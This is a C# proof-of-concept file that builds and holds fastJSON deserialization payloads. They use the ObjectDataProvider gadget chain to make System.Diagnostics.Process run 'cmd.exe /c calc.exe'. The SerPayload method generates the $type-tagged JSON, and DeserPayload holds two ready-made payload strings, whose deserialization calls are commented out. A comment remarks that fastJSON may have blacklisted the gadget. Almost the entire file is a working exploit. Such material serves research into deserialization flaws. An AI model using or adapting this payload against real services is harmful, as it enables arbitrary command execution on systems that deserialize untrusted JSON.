using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Navigation;
using System.Windows.Data;
using fastJSON;
using System.Collections.Specialized;
using System.Reflection.Emit;

namespace Fastjson_ObjectDataProvider
{
    class Program
    {
        static string SerPayload()
        {
            ProcessStartInfo processinfo = new ProcessStartInfo();
            processinfo.FileName = "cmd.exe";
            processinfo.Arguments = " /c calc.exe";

            var process = new Process();
            process.StartInfo = processinfo;

            ObjectDataProvider odp = new ObjectDataProvider();
            odp.MethodName = "Start";
            odp.ObjectInstance = process;

            JSONParameters jsonpara = new JSONParameters
            {
                UseExtensions = true,
            };

            string content = JSON.ToJSON(odp);
            Console.WriteLine(content);
            return content;
        }

        // 好像fastjson 更新，将ObjectDataProvider 加入黑名单了
        static void DeserPayload()
        {
            string payload = @"
{
    ""$types"":{
        ""System.Windows.Data.ObjectDataProvider, PresentationFramework, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = 31bf3856ad364e35"":""1"",
        ""System.Diagnostics.Process, System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089"":""2"",
        ""System.Diagnostics.ProcessStartInfo, System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089"":""3""
    },
    ""$type"":""1"",
    ""ObjectInstance"":{
        ""$type"":""2"",
        ""StartInfo"":{
            ""$type"":""3"",
            ""Arguments"":"" /c calc.exe"",
            ""FileName"":""cmd.exe"",
        },
    },
    ""MethodName"":""Start"",
}";

            string payload2 = @"{""$types"":{""System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"":""1"",""System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"":""3"",""System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"":""5""},""$type"":""1"",""ObjectInstance"":{""$type"":""3"",""StartInfo"":{""$type"":""5"",""Verb"":"""",""Arguments"":""/c calc.exe"",""CreateNoWindow"":false,""RedirectStandardInput"":false,""RedirectStandardOutput"":false,""RedirectStandardError"":false,""UseShellExecute"":true,""UserName"":"""",""Domain"":"""",""LoadUserProfile"":false,""FileName"":""cmd.exe"",""WorkingDirectory"":"""",""ErrorDialog"":false,""WindowStyle"":""Normal""},""EnableRaisingEvents"":false},""MethodName"":""Start"",""IsAsynchronous"":false,""IsInitialLoadEnabled"":true}";
            JSONParameters jsonPara = new JSONParameters
            {
                UseExtensions = true,
            };

            //var instance = JSON.ToObject(jsonObj, jsonPara);
            //var instance = JSON.ToObject(payload2 );
        }

        static void Main(string[] args)
        {
            string payload = SerPayload();
            //DeserPayload();
        }
    }
}
